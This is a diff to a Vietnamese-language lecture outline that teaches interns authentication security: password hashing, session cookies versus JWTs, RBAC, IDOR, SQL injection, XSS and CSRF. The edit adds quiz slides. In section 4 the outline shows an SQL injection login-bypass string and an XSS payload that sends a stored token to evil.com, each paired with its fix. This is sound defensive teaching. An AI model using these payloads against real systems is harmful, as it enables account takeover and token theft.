@@ -3,7 +3,7 @@
 
 > **Đối tượng:** Intern Backend + Frontend (đã biết HTTP, REST, viết được API CRUD; chưa từng tự làm login)
 > **Presenter:** Truc Le — toàn bộ
-> **Thời lượng:** ~45 phút + 10 phút Kahoot · ~40 slide
+> **Thời lượng:** ~52 phút + 10 phút Kahoot · ~53 slide (gồm 7 slide câu hỏi "Your turn", mỗi slide ~1 phút)
 
 File này là nguồn nội dung cho slide. Slide là bản tiếng Anh của outline này, không viết lại tự do.
 Nội dung rút gọn từ [spartan-khanhdo/auth-security-lecture](https://github.com/spartan-khanhdo/auth-security-lecture) cho mức Intern.
@@ -12,6 +12,7 @@ Nội dung rút gọn từ [spartan-khanhdo/auth-security-lecture](https://githu
 - Mỗi khái niệm đi kèm **một thứ intern sẽ gặp ngay tuần đầu**: response 401/403, cookie trong DevTools, chuỗi `eyJ…` trong header, nút "Login with Google".
 - Vấn đề trước, định nghĩa sau. Không có RFC number, không có tên attack hiếm.
 - Mỗi section kết thúc bằng **1 slide "Làm / Đừng làm"** — thứ intern mang về dùng được.
+- Trước vài khái niệm chính có **1 slide "Your turn"**: hỏi khán phòng, 30 s bàn với người bên cạnh, 2–3 lựa chọn A/B/C, bấm → mới lật đáp án. Không đánh số outline (để giữ nguyên 1.2, 2.4…).
 - **Cắt khỏi bản gốc:** OAuth 1.0, PKCE chi tiết, refresh token reuse detection, key rotation / JWKS, mTLS / service mesh / service-to-service, ABAC, SAML, Micronaut config, timing attack chi tiết.
 
 ---
@@ -38,21 +39,26 @@ Nội dung rút gọn từ [spartan-khanhdo/auth-security-lecture](https://githu
 ## 1. Mật khẩu
 
 - **1.1 Lưu plaintext:** bảng `users(email, password)` → một lần dump DB = lộ mọi password; người dùng xài lại password ở Gmail, ngân hàng. Không bao giờ lưu plaintext, kể cả "chỉ là môi trường dev".
+- **Your turn (trước 1.2):** "Encryption vs hashing: khác nhau chỗ nào, password dùng cái nào?" → hash (nhưng không phải SHA-256).
 - **1.2 Encryption ≠ hashing:** encryption 2 chiều (có key là giải được — key nằm cùng server với DB). Hashing 1 chiều: `hash("hunter2")` → không đảo ngược được. Login = hash lại input rồi so sánh. Password → **hash**, không encrypt.
 - **1.3 Hash nhanh vẫn hỏng:** SHA-256/MD5 được thiết kế để *nhanh* → GPU thử ~10 tỷ lần/giây. Rainbow table: bảng tra sẵn `hash → password` cho password phổ biến. `123456` bị crack tức thì.
+- **Your turn (trước 1.4):** "An và Bình cùng gõ `123456`, làm sao để 2 hash lưu trong DB khác nhau?" → thêm giá trị random cho mỗi user = salt.
 - **1.4 Salt:** random string riêng cho từng user, lưu cạnh hash. Cùng password `123456` → 2 hash khác nhau → rainbow table vô dụng, crack 1 user không lộ user khác.
 - **1.5 Hash chậm có chủ đích:** bcrypt / Argon2 có cost factor. bcrypt cost 12 ≈ 250 ms/lần — user không thấy, attacker thử 1 tỷ lần thì mất hàng trăm năm. bcrypt tự sinh salt, salt nằm sẵn trong chuỗi `$2b$12$…`.
 - **1.6 Làm / Đừng làm:** dùng `bcrypt`/`argon2` của thư viện, không tự viết · so sánh bằng hàm `compare` của thư viện, không dùng `==` · không log password, không trả hash ra API · thông báo lỗi chung "Email hoặc mật khẩu không đúng" (không nói email có tồn tại hay không).
 
 ## 2. Giữ trạng thái đăng nhập
 
+- **Your turn (trước 2.1):** "Login xong, request sau server biết vẫn là bạn bằng cách nào?" → gửi lại thứ server đưa lúc login (session cookie / JWT).
 - **2.1 HTTP không nhớ gì:** login thành công ở request 1, request 2 server không biết bạn là ai. Cần một "vé" gửi kèm mỗi request. Có 2 kiểu vé.
 - **2.2 Session cookie (stateful):** server tạo `session_id` random, lưu `{session_id → user_id}` trong DB/Redis, gửi `Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax`. Browser tự gửi cookie lại. Logout = xoá dòng session → có hiệu lực ngay. Mở DevTools → Application → Cookies để thấy.
 - **2.3 JWT (stateless):** 3 phần `header.payload.signature`, mỗi phần là base64url. Payload chứa `sub`, `role`, `exp`. Server ký bằng secret; request sau chỉ cần **kiểm chữ ký**, không cần tra DB. Dán thử vào jwt.io.
+- **Your turn (trước 2.4):** "Không có secret, đọc được payload JWT không?" → được, chỉ là base64.
 - **2.4 Base64 ≠ mã hoá:** ai cũng đọc được payload. Không bao giờ để password, số thẻ, thông tin nhạy cảm trong JWT.
 - **2.5 Sửa payload thì sao:** đổi `"role":"viewer"` → `"admin"` → chữ ký không khớp → `401`. Chữ ký chống *sửa*, không chống *đọc*. Bẫy đã từng xảy ra: server chấp nhận `alg: none` hoặc quên verify → luôn verify bằng thư viện, chỉ định rõ thuật toán.
 - **2.6 Session vs JWT:** bảng — lưu ở đâu · tra DB mỗi request · logout ngay lập tức · phù hợp. Session: web app 1 backend, cần logout tức thì. JWT: nhiều service cần tự kiểm tra, mobile app. Nhược điểm lớn của JWT: **không thu hồi được trước `exp`**.
 - **2.7 Access token ngắn + refresh token:** access token sống 15 phút (lộ thì thiệt hại ít), refresh token sống 7–30 ngày, lưu server-side, dùng để xin access token mới; logout = xoá refresh token. Không đi sâu vào rotation.
+- **Your turn (trước 2.8):** "Token để ở đâu trên browser?" → mặc định cookie `HttpOnly`, không phải `localStorage`.
 - **2.8 Lưu token ở đâu trên browser:** `localStorage` → bất kỳ script nào (kể cả script XSS) đọc được. Cookie `HttpOnly` → JavaScript không đọc được. Mặc định: cookie `HttpOnly; Secure; SameSite`. Liên kết sang XSS/CSRF ở section 4.
 - **2.9 Làm / Đừng làm.**
 
@@ -68,8 +74,10 @@ Nội dung rút gọn từ [spartan-khanhdo/auth-security-lecture](https://githu
 ## 4. Phân quyền & 4 lỗi hay gặp
 
 - **4.1 RBAC:** user → role → permission. `viewer: read` · `editor: read, write` · `admin: read, write, delete`. Code kiểm *permission*, không kiểm tên role (`can(user, "orders:delete")`, không `if role == "admin"`).
+- **Your turn (trước 4.2):** "Nút Delete đã ẩn với viewer, API có an toàn không?" → không, curl/Postman không thấy UI.
 - **4.2 Ẩn nút ≠ phân quyền:** frontend ẩn nút Delete nhưng API vẫn nhận → ai có Postman/curl cũng gọi được. Mọi kiểm tra quyền phải ở backend.
 - **4.3 Broken Access Control (OWASP #1):** `GET /orders/1024` → đổi thành `/orders/1025` thấy đơn của người khác (IDOR). Fix: `WHERE id = ? AND user_id = ?` — luôn kiểm *quyền sở hữu*, không chỉ kiểm "đã login".
+- **Your turn (trước 4.4):** "Gõ `' OR '1'='1` vào ô password thì sao?" → login được (nếu SQL nối bằng `+`), thường vào bằng user đầu tiên: admin.
 - **4.4 SQL Injection:** `"SELECT * FROM users WHERE email = '" + email + "'"` với input `' OR '1'='1` → login không cần password. Fix: parameterized query / ORM, không bao giờ nối chuỗi.
 - **4.5 XSS:** comment chứa `<script>fetch('https://evil.com?c='+localStorage.token)</script>` → chạy trên trình duyệt của người khác → đánh cắp token (nối với 2.8). Fix: framework escape mặc định (React `{}`), tránh `dangerouslySetInnerHTML`/`innerHTML`, token trong cookie `HttpOnly`.
 - **4.6 CSRF:** browser tự gửi cookie → trang `evil.com` có form ẩn POST tới `bank.com/transfer` → request đi kèm cookie của user. Fix: `SameSite=Lax/Strict` + CSRF token cho form. JWT trong header `Authorization` không bị CSRF (nhưng lại dễ dính XSS) — không có lựa chọn miễn phí.
